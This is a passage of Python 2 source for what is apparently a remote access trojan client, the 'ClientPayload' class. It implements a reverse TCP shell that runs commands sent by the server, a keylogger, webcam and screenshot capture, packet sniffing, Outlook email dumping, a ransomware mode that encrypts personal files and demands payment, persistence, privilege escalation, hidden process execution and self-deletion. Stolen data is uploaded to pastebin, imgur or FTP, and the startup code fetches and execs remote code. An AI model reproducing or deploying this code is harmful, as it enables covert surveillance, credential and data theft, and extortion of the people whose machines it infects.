        sniffer_socket = socket.socket(socket.PF_PACKET, socket.SOCK_RAW, socket.htons(0x0003))
        while time.time() < limit:
            try:
                recv_data = sniffer_socket.recv(2048)
                recv_data, ip_bool = self._packetsniffer_eth_header(recv_data)
                if ip_bool:
                    recv_data, ip_proto = self._packetsniffer_ip_header(recv_data)
                    if ip_proto == 6:
                        recv_data = self._packetsniffer_tcp_header(recv_data)
                    elif ip_proto == 17:
                        recv_data = self._packetsniffer_udp_header(recv_data)
            except: break
        try:
            sniffer_socket.close()
        except: pass
        try:
            output = cStringIO.StringIO('\n'.join(self.packetsniffer.capture))
            result = self._upload_pastebin(output) if 'ftp' not in mode else self._upload_ftp(output, filetype='.pcap')
        except Exception as e:
            self.debug("packetsniffer manager error: {}".format(str(e)))



    @config(platforms=['win32','linux2','darwin'], command=True, usage='cd <path>')
    def cd(self, path='.'):
        """
        change current working directory
        """
        try:
            if os.path.isdir(path):
                return os.chdir(path)
            else:
                return os.chdir('.')
        except Exception as e:
            self.debug("{} error: '{}'".format(self.cd.func_name, str(e)))           


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ls <path>')
    def ls(self, path='.'):
        """
        list directory contents
        """
        try:
            output = []
            if os.path.isdir(path):
                for line in os.listdir(path):
                    if len('\n'.join(output + [line])) < 2048:
                        output.append(line)
                    else:
                        break
                return '\n'.join(output)
            else:
                return "Error: path not found"
        except Exception as e2:
            self.debug("{} error: {}".format(self.ls.func_name, str(e2)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ps [args]')
    def ps(self, args=None):
        """
        alias for 'process'
        """
        if not args:
            return self.ps.usage
        else:
            cmd, _, action = str(args).partition(' ')
            if hasattr(self, '_process_%s' % cmd):
                try:
                    return getattr(self, '_process_%s' % cmd)(action)
                except Exception as e:
                    self.debug("{} error: {}".format(self.ps.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='pwd')
    def pwd(self):
        """
        show name of present working directory
        """
        try:
            return os.getcwd()
        except Exception as e:
            self.debug("{} error: '{}'".format(self.pwd.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='cat <path>')
    def cat(self, path):
        """
        display file contents
        """
        try:
            output = []
            if not os.path.isfile(path):
                return "Error: file not found"
            target = open(path, 'rb')
            while True:
                try:
                    line = target.readline().rstrip()
                    if not line.isspace() and len('\n'.join(output + [line])) < 4096:
                        output.append(line)
                    else:
                        break
                except Exception as e1:
                    self.debug("{} error: '{}'".format(self.cat.func_name, str(e1)))
            return output.rstrip()
        except Exception as e2:
            self.debug("{} error: '{}'".format(self.cat.func_name, str(e2))  )      


    @config(platforms=['win32','linux2','darwin'], command=True, usage='set <cmd> [key=value]')
    def set(self, arg):
        """
        set client options
        """
        try:
            target, _, opt = arg.partition(' ')
            option, _, val = opt.partition('=')
            if val.isdigit() and int(val) in (0,1):
                val = bool(int(val))
            elif val.isdigit():
                val = int(val)
            elif val.lower() in ('true', 'on', 'enable'):
                val = True
            elif val.lower() in ('false', 'off', 'disable'):
                val = False
            elif ',' in val:
                val = val.split(',')
            if hasattr(self, target):
                try:
                    setattr(getattr(self, target), option, val)
                except:
                    try:
                        getattr(self, target).func_dict[option] = val
                    except: pass
                try:
                    return json.dumps(vars(getattr(self, target)))
                except:
                    return bytes(vars(getattr(self, target)))
            else:
                return "Target attribute '{}' not found".format(str(target))
        except Exception as e:
            self.debug("{} error: '{}'".format(self.set.func_name, str(e)))

    
    @config(platforms=['win32','linux2','darwin'], command=True, usage='sms <send/read> [args]')
    def sms(self, args):
        """
        send/view SMS text message
        """
        try:
            mode, _, args = str(args).partition(' ')
            if 'send' in mode:
                phone_number, _, message = args.partition(' ')
                return self._sms_send(phone_number, message)
            else:
                return 'usage: <send/read> [args]\n  arguments:\n\tphone    :   phone number with country code - no spaces (ex. 18001112222)\n\tmessage :   text message to send surrounded by quotes (ex. "example text message")'
        except Exception as e:
            self.debug("{} error: '{}'".format(self.sms.func_name, str(e)))
        

    @config(platforms=['win32','linux2','darwin'], command=True, usage='eval <code>')
    def eval(self, code):
        """
        execute Python code in current context
        """
        try:
            return eval(code)
        except Exception as e:
            self.debug("{} error: {}".format(self.eval.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='wget <url>')
    def wget(self, url, filename=None):
        """
        download file from url and return path name
        """
        if url.startswith('http'):
            try:
                path, _ = urllib.urlretrieve(url, filename) if filename else urllib.urlretrieve(url)
                return path
            except Exception as e:
                self.debug("{} error: {}".format(self.wget.func_name, str(e)))
        else:
            return "Invalid target URL - must begin with 'http'"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='kill')
    def kill(self, debug=False):
        """
        shutdown the current connection and reset session
        """
        try:
            if 'connection' not in self._session:
                self._session['connection'] = threading.Event()
            if 'prompt' not in self._session:
                self._session['prompt'] = threading.Event()
            self._session['connection'].clear()
            self._session['prompt'].clear()
        except Exception as e:
            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
        try:
            self._session.get('socket').close()
        except Exception as e:
            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
        try:
            self._session['id']          = None
            self._session['key']         = None
            self._session['prompt']      = None
            self._session['public_key']  = None
        except Exception as e:
            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None
        try:
            jobs = self._workers.keys()
            for job in jobs:
                _ = self._workers.pop(job, None)
                del _
        except Exception as e:
            self.debug("{} error: {}".format(self.kill.func_name, str(e))) if debug else None


    @config(platforms=['win32','linux2','darwin'], command=True, usage='help')
    def help(self, cmd=None):
        """
        list commands with usage information
        """
        if not cmd:
            try:
                return json.dumps({self._command[c]['usage']: self._command[c]['description'] for c in self._command if 'prompt' not in c})
            except Exception as e1:
                self.debug("{} error: {}".format(self.help.func_name, str(e1)))
        elif hasattr(self, str(cmd)) and 'prompt' not in cmd:
            try:
                return json.dumps({self._command[cmd]['usage']: self._command[cmd]['description']})
            except Exception as e2:
                self.debug("{} error: {}".format(self.help.func_name, str(e2)))
        else:
            return "Invalid command - '{}' not found".format(cmd)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='show <value>')
    def show(self, attribute):
        """
        show value of a client attribute
        """
        try:
            attribute = str(attribute)
            if 'jobs' in attribute:
                return json.dumps({a: self._get_job_status(self._workers[a].name) for a in self._workers if self._workers[a].is_alive()})
            elif 'privileges' in attribute:
                return json.dumps({'username': self._sysinfo.get('username'),  'administrator': 'true' if bool(os.getuid() == 0 if os.name is 'posix' else ctypes.windll.shell32.IsUserAnAdmin()) else 'false'})
            elif 'info' in attribute:
                return json.dumps(self._sysinfo)
            elif hasattr(self, attribute):
                try:
                    return json.dumps(getattr(self, attribute))
                except:
                    try:
                        return json.dumps(vars(getattr(self, attribute)))
                    except: pass
            elif hasattr(self, str('_%s' % attribute)):
                try:
                    return json.dumps(getattr(self, str('_%s' % attribute)))
                except:
                    try:
                        return json.dumps(vars(getattr(self, str('_%s' % attribute))))
                    except: pass
            else:
                return self.show.usage
        except Exception as e:
            self.debug("'{}' error: '{}'".format(self._workers.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='stop <job>')
    def stop(self, target):
        """
        stop a running job
        """
        try:
            if target in self._workers:
                _ = self._workers.pop(target, None)
                del _
                return "Job '{}' was stopped.".format(target)
            else:
                return "Job '{}' not found".format(target)
        except Exception as e:
            self.debug("{} error: '{}'".format(self.stop.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='scan <host>')
    def scan(self, args):
        """
        scan host/network for online hosts and open ports
        """
        try:
            args = str(args).split()
            host = [i for i in args if self._get_if_ipv4(i)][0] if len([i for i in args if self._get_if_ipv4(i)]) else self._sysinfo.get('local')
            return self._scan_network(host) if 'network' in args else self._scan_host(host)
        except Exception as e:
            self.debug("{} error: '{}'".format(self.scan.func_name, str(e)))       


    @config(platforms=['win32','linux2','darwin'], command=True, usage='unzip <file>')
    def unzip(self, path):
        """
        unzip a compressed archive/file
        """
        if os.path.isfile(path):
            try:
                _ = zipfile.ZipFile(path).extractall('.')
                return os.path.splitext(path)[0]
            except Exception as e:
                self.debug("{} error: '{}'".format(self.unzip.func_name, str(e)))
        else:
            return "File '{}' not found".format(path)


    @config(platforms=['win32','linux2','darwin'], command=True, usage='abort')
    def abort(self):
        """
        self-destruct and leave no trace on the disk
        """
        try:
            self._abort = True

            for method in self.persistence.methods:
                if self.persistence.methods[method].get('established'):
                    try:
                        remove = getattr(self, '_persistence_remove_{}'.format(method))()
                    except Exception as e2:
                        self.debug("{} error: {}".format(method, str(e2)))
            try:
                os.remove(__file__)
            except: pass
            try:
                os.remove(sys.argv[0])
            except: pass
            try:
                _ = os.popen(bytes('del /f /q %s' % __file__ if os.name is 'nt' else 'rm -f %s' % __file__)).read()
            except: pass            
        finally:
            _shutdown = lambda: os.popen('shutdown /p /f' if os.name is 'nt' else 'shutdown --poweroff --no-wall').read()
            shutdown = threading.Timer(2, _shutdown)
            taskkill = threading.Timer(1, self._process_kill, args=('python',))
            shutdown.daemon = True
            taskkill.daemon = True
            shutdown.start()
            taskkill.start()
            sys.exit()


    @config(platforms=['win32','darwin'], inbox=OrderedDict(), command=True, usage='email <option>')
    def email(self, args=None):
        """
        access Outlook email without opening application
        """       
        if not args:
            try:
                CoInitialize()
                installed = Dispatch('Outlook.Application').GetNameSpace('MAPI')
                return "Outlook is installed on this host"
            except: pass
            return "Outlook not installed on this host"
        else:
            try:
                mode, _, arg   = str(args).partition(' ')
                if hasattr(self, '_email_%s' % mode):
                    if 'dump' in mode:
                        self._workers[self._email_dump.func_name] = threading.Thread(target=self._email_dump, kwargs={'n': arg}, name=time.time())
                        self._workers[self._email_dump.func_name].daemon = True
                        self._workers[self._email_dump.func_name].start()
                        return "Dumping emails from Outlook inbox"
                    else:
                        return getattr(self, '_email_%s' % mode)(arg)
                else:
                    return "usage: email <dump/read> [#]"
            except Exception as e:
                self.debug("{} error: {}".format(self.email.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='ransom <mode> [path]')
    def ransom(self, args):
        """
        encrypt personal files and ransom them
        """
        if not args:
            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"
        
        cmd, _, action = str(args).partition(' ')

        if not self._session['id']:
            return "{} error: {}".format(ClientPayload._ransom_payment.func_name, "no session ID")
            
        if not ClientPayload._config['api'].get('ransom'):
            return "{} error: {}".format(ClientPayload._ransom_payment.func_name, "no target URL")

        if 'payment' in cmd:
            return self._ransom_payment(self._session['id'])
            
        elif 'decrypt' in cmd:
            rsa_key  = RSA.importKey(action)
            for key, value in self._results.items():
                if 'ransom' in value.get('command') and 'encrypt' in value.get('command') and len(value.get('result')) > 50:
                    path    = ''.join(value.get('command').spit()[2]).replace('?', '/').encode()
                    cipher  = PKCS1_OAEP.new(rsa_key)
                    aes     = cipher.decrypt(base64.b64decode(value.get('result')))
                    result  = self._decrypt_file(path, key=aes)
                    self.debug('%s decrypted' % result)
                    _ = self._results.pop(key, None)
            return "Decrypting files"

        elif 'encrypt' in cmd:
            if os.path.isfile(action):
                return self._ransom_encrypt(action)
            elif os.path.isdir(action):
                self._workers["ransom-tree-walk"] = threading.Thread(target=os.path.walk, args=(action, lambda _, d, f: [self._tasks.put_nowait((self._ransom_encrypt, os.path.join(d, ff))) for ff in f], None), name=time.time())
                self._workers["ransom-tree-walk"].daemon = True
                self._workers["ransom-tree-walk"].start()
                for i in range(1,10):
                    self._workers["ransom-%d" % i] = threading.Thread(target=self._task_threader, name=time.time())
                    self._workers["ransom-%d" % i].daemon = True
                    self._workers["ransom-%d" % i].start()
                return "Encrypting files"
            else:
                return "Error: '{}' not found".format(action)
        else:
            return "\tusage: ransom <mode> [path]\n\tmodes: encrypt, decrypt, payment"


    @config(platforms=['win32','linux2','darwin'], command=True, usage='upload <mode> <file>')
    def upload(self, args):
        """
        upload file to imgur, pastebin, or ftp server
        """
        try:
            mode, _, source = str(args).partition(' ')
            target  = '_upload_{}'.format(mode)
            if not source or not hasattr(self, target):
                return self.upload.usage
            return getattr(self, target)(source)
        except Exception as e:
            self.debug("{} error: '{}'".format(self.upload.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='webcam <mode> [options]')
    def webcam(self, args=None):
        """
        stream the webcam or capture image/video
        """
        if not args:
            return self.webcam.usage
        try:
            args = str(args).split()
            if 'stream' in args:
                if len(args) != 2:
                    return "Error - stream mode requires argument: 'port'"
                elif not str(args[1]).isdigit():
                    return "Error - port must be integer between 1 - 65355"
                else:
                    return self._webcam_stream(port=args[1])
            else:
                return self._webcam_image(*args) if 'video' not in args else self._webcam_video(*args)
        except Exception as e:
            self.debug("{} error: '{}'".format(self.webcam.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='standby')
    def standby(self):
        """
        disconnect from server but keep client alive
        """
        try:
            self._workers[self.standby.func_name] = threading.Timer(1.0, self._get_standby_mode)            
            self._workers[self.standby.func_name].start()
            return "Standby mode enabled. Awaiting further instructions.".format(self._sysinfo.get('ip'))
        except Exception as e:
            self.debug("{} error: '{}'".format(self.standby.func_name, str(e)))


    @config(platforms=['win32'], command=True, usage='escalate')
    def escalate(self):
        """
        attempt to escalate privileges
        """
        try:
            if self._get_administrator():
                return "Current user '{}' has administrator privileges".format(self._sysinfo.get('username'))
            if ClientPayload._config['resources'].get('stager') and os.path.isfile(long_to_bytes(long(ClientPayload._config['resources'].get('stager')))):
                if os.name is 'nt':
                    ShellExecuteEx(lpVerb='runas', lpFile=sys.executable, lpParameters='{} asadmin'.format(long_to_bytes(long(ClientPayload._config['resources'].get('stager')))))
                else:
                    return "Privilege escalation not yet available on '{}'".format(sys.platform)
        except Exception as e:
            self.debug("{} error: '{}'".format(self.escalate.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], process_list={}, command=True, usage='execute <path>')
    def execute(self, path):
        """
        run an executable program in a hidden process
        """
        if os.path.isfile(path):
            name = os.path.splitext(os.path.basename(path))[0]
            try:
                info = subprocess.STARTUPINFO()
                info.dwFlags = subprocess.STARTF_USESHOWWINDOW | subprocess.CREATE_NEW_PROCESS_GROUP
                info.wShowWindow = subprocess.SW_HIDE
                self.execute.process_list[name] = subprocess.Popen(path, startupinfo=info)
                return "Running '{}' in a hidden process".format(path)
            except Exception as e:
                try:
                    self.execute.process_list[name] = subprocess.Popen(path, 0, None, None, subprocess.PIPE, subprocess.PIPE)
                    return "Running '{}' in a new process".format(name)
                except Exception as e:
                    self.debug("{} error: {}".format(self.execute.func_name, str(e)))
        else:
            return "File '{}' not found".format(str(path))


    @config(platforms=['win32','linux2','darwin'], mode='stop', max_bytes=4000, buffer=cStringIO.StringIO(), window=None, command=True, usage='keylogger <start/stop/dump>')
    def keylogger(self, mode=None):
        """
        start/stop/dump the keylogger
        """
        if not mode:                                                                                                                                                                                                                                                                                             
            if self.keylogger.func_name not in self._workers:
                return self.keylogger.usage
            else:
                return self._keylogger_status()
        else:
            if 'start' in mode:
                if self.keylogger.func_name not in self._workers:
                    self._workers[self.keylogger.func_name] = threading.Thread(target=self._keylogger, name=time.time())
                    self._workers[self.keylogger.func_name].setDaemon(True)
                    self._workers[self.keylogger.func_name].start()
                    self.keylogger.mode = 'running'
                    return self._keylogger_status()
                else:
                    self.keylogger.mode = 'running'
                    return self._keylogger_status()
            elif 'stop' in mode:
                try:
                    self.stop(self.keylogger.func_name)
                except: pass
                try:
                    self.stop(self._keylogger_manager.func_name)
                except: pass
                self.keylogger.mode = 'stopped'
                return self._keylogger_status()
            elif 'auto' in mode:
                self._workers[self._keylogger_manager.func_name] = threading.Thread(target=self._keylogger_manager, name=time.time())
                self._workers[self._keylogger_manager.func_name].setDaemon(True)
                self._workers[self._keylogger_manager.func_name].start()
                self.keylogger.mode = 'running'
                return self._keylogger_status()
            elif 'dump' in mode:
                result = self._upload_pastebin(self.keylogger.buffer) if not 'ftp' in mode else self._upload_ftp(self.keylogger.buffer)
                self.keylogger.buffer.reset()
                return result
            elif 'status' in mode:
                return self._keylogger_status()
            else:
                return self.keylogger.usage


    @config(platforms=['win32','linux2','darwin'], command=True, usage='screenshot [mode]')
    def screenshot(self, *args):
        """
        capture a screenshot from host device
        """
        try:
            with mss.mss() as screen:
                img = screen.grab(screen.monitors[0])
            png     = self._get_png_from_data(img)
            result  = self._upload_imgur(png) if 'ftp' not in args else self._upload_ftp(png, filetype='.png')
            return result
        except Exception as e:
            self.debug("{} error: '{}'".format(self.screenshot.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], methods={method: {'established': bool(), 'result': bytes()} for method in ['encrypted_stager','hidden_file','scheduled_task','registry_key','startup_file','launch_agent','crontab_job']}, command=True, usage='persistence <args>')
    def persistence(self, args=None):
        """
        establish persistence to survive reboots
        """
        try:
            if not args:
                for method in [_ for _ in self.persistence.methods if not self.persistence.methods[_]['established']]:
                    target = '_persistence_add_{}'.format(method)
                    if sys.platform in getattr(self, target).platforms:
                        established, result = getattr(self, target)()
                        self.persistence.methods[method]['established'] = established
                        self.persistence.methods[method]['result'] = result
                return json.dumps({k: v for k,v in self.persistence.methods if sys.platform in getattr(self, k).platforms}, indent=2)
            else:
                cmd, _, method = str(args).partition(' ')
                if 'method' in cmd:
                    return json.dumps(self.persistence.methods)
                elif not method or cmd not in ('add','remove') or method not in self.persistence.methods:
                    return self.persistence.usage
                elif self.persistence.methods[method].get('established'):
                    return json.dumps(self.persistence.methods[method])
                else: 
                    target = '_persistence_{}_{}'.format(cmd, method)
                    if sys.platform in getattr(self, target).platforms:
                        established, result = getattr(self, target)()
                        self.persistence.methods[method]['established'] = established
                        self.persistence.methods[method]['result'] = result
                    return json.dumps(self.persistence.methods[method])
        except Exception as e:
            self.debug("{} error: '{}'".format(self.persistence.func_name, str(e)))


    @config(platforms=['linux2','darwin'], capture=[], command=True, usage='packetsniffer [mode]')
    def packetsniffer(self, args):
        """
        sniff local network and capture packets
        """
        try:
            cmd, _, action = str(args).partition(' ')
            if 'start' in cmd:
                mode   = None
                length = None
                for arg in action.split():
                    if arg.isdigit():
                        length = int(arg)
                    elif arg in ('ftp','pastebin'):
                        mode   = arg
                self._workers[self.packetsniffer.func_name] = threading.Thread(target=self._get_packets, kwargs={'seconds': length, 'mode': mode}, name=time.time())
                self._workers[self.packetsniffer.func_name].start()
                return 'Capturing network traffic for {} seconds'.format(duration)
        except Exception as e:
            self.debug("{} error: '{}'".format(self.packetsniffer.func_name, str(e)))


    @config(platforms=['win32'], buffer=cStringIO.StringIO(), max_bytes=1024, command=True, usage='process <mode> [arg]')
    def process(self, args=None):
        """
        list/search/kill/monitor currently running processes
        """
        try:
            if not args:
                return self.process.usage
            else:
                cmd, _, action = str(args).partition(' ')
                if 'monitor' in cmd:
                    if action:
                        return self._process_start_monitor(keyword=action)
                    else:
                        return self._process_start_monitor()
                else:
                    if hasattr(self, '_process_%s' % cmd):
                        return getattr(self, '_process_%s' % cmd)(action)
                    else:
                        return "usage: process <list/search/kill/monitor>"
        except Exception as e:
            self.debug("{} error: '{}'".format(self.process.func_name, str(e)))


    @config(platforms=['win32','linux2','darwin'], command=True, usage='prompt')
    def prompt(self, *args,  **kwargs):
        """
        shell prompt utility
        """
        try:
            return '[{} @ %s]> ' % os.getcwd()
        except Exception as e:
            self.debug("{} error: '{}'".format(self.process.func_name, str(e)))

        
    def reverse_tcp_shell(self):
        """
        send encrypted shell back to server via outgoing TCP connection
        """
        try:
            while True:
                if self._session['connection'].wait(timeout=3.0):
                    task = self._server_recv()
                    if task:
                        result  = ""
                        cmd, _, action  = bytes(task['command']).partition(' ')
                        if cmd in self._command:
                            try:
                                result  = bytes(self._command[cmd]['method'](action)) if len(action) else bytes(self._command[cmd]['method']())
                            except Exception as e1:
                                result  = "Error: %s" % bytes(e1)
                        else:
                            try:
                                result  = bytes().join(subprocess.Popen(cmd, 0, None, subprocess.PIPE, subprocess.PIPE, subprocess.PIPE, shell=True).communicate())
                            except Exception as e2:
                                result  = "Error: %s" % bytes(e2)
                                
                        if result and result != "None":
                            task.update({'result': result})
                            if cmd in ClientPayload._config['tasks'] and 'PRIVATE KEY' not in task['command']:
                                self._results[task['task']] = task
                            self._server_send(**task)
                else:        
                    self.debug("{} stopped. Restarting in 5 seconds...".format(self.reverse_tcp_shell.func_name))
                    break
            self.kill()
            time.sleep(5)
            return self.run()
        except Exception as e:
            self.debug("{} error: '{}'".format(self.reverse_tcp_shell.func_name, str(e)))


    @staticmethod
    def debug(data):
        """
        print output to console if debugging mode is enabled
        """
        if ClientPayload._debug:
            with ClientPayload._lock:
                try:
                    print(bytes(data))
                except Exception as e:
                    print("{} error: {}".format(ClientPayload.debug.func_name, str(e)))


    def connect(self, **kwargs):
        """
        connect to server and start new session
        """
        self._session['prompt']         = threading.Event()
        self._session['connection']     = threading.Event()
        try:
            self._server_connect()
            self._session['key']        = self._session_key()
            self._session['id']         = self._session_id()
            self._session['public_key'] = self._get_public_key()
            self._session['prompt'].set()
        except Exception as e:
            self.debug("{} error: '{}'".format(self.connect.func_name, str(e)))


    def run(self, *args, **kwargs):
        """
        initiate client startup routine
        """
        try:
            self.connect(*args, **kwargs)
            if self._session['connection'].wait(timeout=3.0):
                self._workers[self.reverse_tcp_shell.func_name] = threading.Thread(target=self.reverse_tcp_shell, name=time.time())
                self._workers[self.reverse_tcp_shell.func_name].start()
                self._workers[self._task_manager.func_name] = threading.Thread(target=self._task_manager, name=time.time())
                self._workers[self._task_manager.func_name].daemon = True
                self._workers[self._task_manager.func_name].start()
            else:
                self.debug("Connection failed - restarting in 5 seconds...")
                self.kill()
                time.sleep(5)
                return self.run()
        except Exception as e:
            self.debug("{} error: {}".format(self.run.func_name, str(e)))



def main(*args, **kwargs):
    ClientPayload._config.update({'api': {}, 'tasks': {}, 'resources': {}})
    if '--debug' in sys.argv:
        ClientPayload._debug = 1
        ClientPayload.debug("Debugging enabled")
    else:
        ClientPayload._debug = 1
    if 'w' in kwargs:
        exec "import urllib" in globals()
        w = kwargs.get('w')
        imports = ClientPayload._get_remote_resource(w)
        exec imports in globals()
    if 'b' in kwargs:
        b   =  kwargs.get('b')
        api_endpoint, api_key = ClientPayload._get_remote_resource(b).splitlines()
        ClientPayload._config['api']['server'] = {'endpoint': api_endpoint, 'api_key': api_key}
    if 'd' in kwargs:
        d = kwargs.get('d')
        imgur_api_key= ClientPayload._get_remote_resource(d)
        ClientPayload._config['api']['imgur']  = {'api_key': imgur_api_key}
    if 'c' in kwargs:
        c = kwargs.get('c')
        pastebin_api_key, pastebin_user_key = ClientPayload._get_remote_resource(c).splitlines()
        ClientPayload._config['api']['pastebin'] = {'api_dev_key': pastebin_api_key, 'api_User_key': pastebin_user_key}          
    if 'o' in kwargs:
        o = kwargs.get('o')
        twilio_sid, twilio_token, twilio_phone = ClientPayload._get_remote_resource(o).splitlines()
        ClientPayload._config['api']['twilio'] = {'account_sid': twilio_sid, 'auth_token': twilio_token, 'phone_number': twilio_phone}
    if 'l' in kwargs:
        l = kwargs.get('l')
        code = ClientPayload._get_remote_resource(l)
        ClientPayload._config['resources']['stager'] = {'code': code}
        if 'r' in kwargs:
            r = kwargs.get('r')
            ClientPayload._config['resources']['stager'].update({'config': r})
    if 'p' in kwargs:
        p = kwargs.get('p')
        ransom_payment_url = ClientPayload._get_remote_resource(p)
        ClientPayload._config['api']['ransom'] = ransom_payment_url
    if 'q' in kwargs:
        q = kwargs.get('q')
        ftp_host, ftp_user, ftp_passwd  = ClientPayload._get_remote_resource(q).splitlines()
        ClientPayload._config['api']['ftp'] = {'hostname': ftp_host, 'username': ftp_user, 'password': ftp_passwd}
    if 'g' in kwargs:
        g = kwargs.get('g')
        bash = ClientPayload._get_remote_resource(g)
        ClientPayload._config['resources']['bash'] = bash
    if 'v' in kwargs:
        v = kwargs.get('v')
        tasks = ClientPayload._get_remote_resource(v).splitlines()
        ClientPayload._config['tasks'] = tasks
    payload = ClientPayload()
    payload.run()
    return payload



if __name__ == '__main__':
    m = main(**{
  "b": "81266016987952607600",
  "c": "78671681703351507562",
  "d": "79030013784106676584",
  "g": "79328323225122003561",
  "j": "76650156158318301560",
  "l": "81040047328712224353",
  "o": "76297441489967984739",
  "p": "80692935077109257793",
  "q": "80324520337976078676",
  "r": "81126388790932157784",
  "t": "79310384705633414777",
  "u": "76299683425183950643",
  "v": "79169592366247143984",
  "w": "77888090548015223857",
  "z": "79892739118577505130"
})


